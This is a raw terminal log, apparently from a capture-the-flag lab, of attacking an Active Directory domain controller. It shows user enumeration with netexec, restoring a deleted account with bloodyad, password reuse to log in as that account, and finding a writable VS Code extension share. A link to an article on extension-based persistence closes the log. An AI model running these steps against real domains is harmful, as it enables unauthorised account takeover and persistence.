└─$ netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
SMB         10.129.190.124  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.190.124  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.190.124  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                                       
SMB         10.129.190.124  445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain                              
SMB         10.129.190.124  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain                            
SMB         10.129.190.124  445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account                                             
SMB         10.129.190.124  445    DC01             alex.turner                   2026-05-09 09:00:08 0                                                                                           
SMB         10.129.190.124  445    DC01             ryan.brooks                   2026-05-10 13:46:18 0                                                                                           
SMB         10.129.190.124  445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account                                                          
SMB         10.129.190.124  445    DC01             james.harper                  2026-05-09 09:02:53 0                                                                                           
SMB         10.129.190.124  445    DC01             sarah.mitchell                2026-05-09 09:02:58 0                                                                                           
SMB         10.129.190.124  445    DC01             emily.carter                  2026-05-09 09:03:05 0                                                                                           
SMB         10.129.190.124  445    DC01             david.reynolds                2026-05-09 09:03:11 0                                                                                           
SMB         10.129.190.124  445    DC01             jessica.coleman               2026-05-09 09:03:15 0                                                                                           
SMB         10.129.190.124  445    DC01             lauren.flores                 2026-05-09 09:03:21 0                                                                                           
SMB         10.129.190.124  445    DC01             michael.torres                2026-05-09 09:03:28 0                                                                                           
SMB         10.129.190.124  445    DC01             kevin.patterson               2026-05-09 09:03:33 0                                                                                           
SMB         10.129.190.124  445    DC01             brian.jenkins                 2026-05-09 09:03:37 0                                                                                           
SMB         10.129.190.124  445    DC01             megan.perry                   2026-05-09 09:03:42 0                                                                                           
SMB         10.129.190.124  445    DC01             max.palmer                    2026-05-26 01:25:15 0                                                                                           
SMB         10.129.190.124  445    DC01             [*] Enumerated 17 local users: CHECKPOINT

└─$ bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object mark.davies

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: Mark Davies
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-06-17 17:36:05+00:00
givenName: Mark
instanceType: 4
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
lastLogonTimestamp: 2026-05-10 13:30:28.285126+00:00
logonCount: 0
msDS-LastKnownRDN: Mark Davies
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3129162710-3498938529-1807524340-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;CI;0x20028;;;S-1-5-21-3129162710-3498938529-1807524340-1101)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: Mark Davies
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: 2217e877-e2a2-47d7-91d4-99ede36f367e
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1102
primaryGroupID: 513
pwdLastSet: 2026-05-09 09:00:48.810500+00:00
sAMAccountName: mark.davies
sAMAccountType: 805306368
sn: Davies
uSNChanged: 151713
uSNCreated: 12771
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: mark.davies@checkpoint.htb
whenChanged: 2026-06-17 17:36:05+00:00
whenCreated: 2026-05-09 09:00:48+00:00



└─$ bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD


└─$ bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb


└─$ netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
SMB         10.129.76.184   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.76.184   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.76.184   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.76.184   445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain
SMB         10.129.76.184   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.76.184   445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account
SMB         10.129.76.184   445    DC01             alex.turner                   2026-05-09 09:00:08 0
SMB         10.129.76.184   445    DC01             mark.davies                   2026-05-09 09:00:48 0


└─$ netexec smb 10.129.76.184 -u 'Mark.Davies' -p 'Checkpoint2024!' --shares
SMB         10.129.76.184   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False)
SMB         10.129.76.184   445    DC01             [+] checkpoint.htb\Mark.Davies:Checkpoint2024! 
SMB         10.129.76.184   445    DC01             [*] Enumerated shares
SMB         10.129.76.184   445    DC01             Share           Permissions     Remark
SMB         10.129.76.184   445    DC01             -----           -----------     ------
SMB         10.129.76.184   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.76.184   445    DC01             C$                              Default share
SMB         10.129.76.184   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.76.184   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.76.184   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.76.184   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.76.184   445    DC01             VMBackups                       
                                                              
https://medium.com/@VakninHai/the-hidden-risks-of-visual-studio-extensions-a-new-avenue-for-persistence-attacks-e56722c048f1
